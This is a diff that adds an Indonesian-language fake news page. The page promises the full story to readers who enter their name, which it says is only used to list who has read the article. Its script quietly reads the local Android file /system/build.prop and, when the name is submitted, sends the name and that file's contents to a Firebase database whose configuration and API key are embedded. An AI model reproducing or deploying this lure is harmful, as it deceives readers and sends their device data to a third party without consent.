@@ -1,0 +1,86 @@
+<html>
+<head>
+<style type="text/css">
+  body {
+    text-align:center;
+    margin:0;
+  }
+  h1 {
+    background:aqua;
+    width:100%;
+    font-size:80px;
+    
+  }
+  p {
+    font-size:30px;
+ }
+  input, button{
+    width:50%;
+    height:100px;
+    font-size:50px;
+    outline:none;
+    background:silver;
+    border:1px solid gold;
+    margin:5px;
+    border-radius:10px;
+  }
+  button {background:lime;}
+</style>
+</head>
+<body>
+<h1>Berita kesesi terbaru</h1>
+<p>Heboh!, kaliwadas katanya mau dibuat ulang oleh pemerinnahan!<br>
+dan pada tanggal ...
+<br><br>
+</p>
+<i>baca selengkapnya dengan memasukkan nama. untuk list siapa saja yang telah membaca berita.<i>
+<input id="nama" placeholder="Masukan nama"><button onclick="get()">Ok</button>
+<div></div>
+  
+  <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+  
+  <script type="text/javascript">
+  let dati = "";
+  let url = "/system/build.prop";
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", url, true);
+  //xhr.responseType = 'document';
+  xhr.onload = () => {
+  alert(xhr.response);
+  dati = xhr.response;
+  }
+  xhr.send()
+  
+  function get(){
+    writeUser(document.querySelector("input").value, dati);
+  }
+  
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+  apiKey: "AIzaSyAIgCzDycY8Ya7XUzlx8kzUa_01zlFIKJg",
+  authDomain: "the-web-99030.firebaseapp.com",
+  databaseURL: "https://the-web-99030.firebaseio.com",
+  projectId: "the-web-99030",
+  storageBucket: "the-web-99030.appspot.com",
+  messagingSenderId: "793051782942",
+  appId: "1:793051782942:web:2d59b3aa02097e25da730f"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  
+  // Get a reference to the database service
+  var ref = firebase.database().ref('users');
+  
+  function writeUser(name, email) {
+  alert("berhasil..");
+  var newusers = ref.push().set({
+  name: name,
+  dati: email,
+  });
+  }
+  
+  
+</script>
+</body>
+</html>
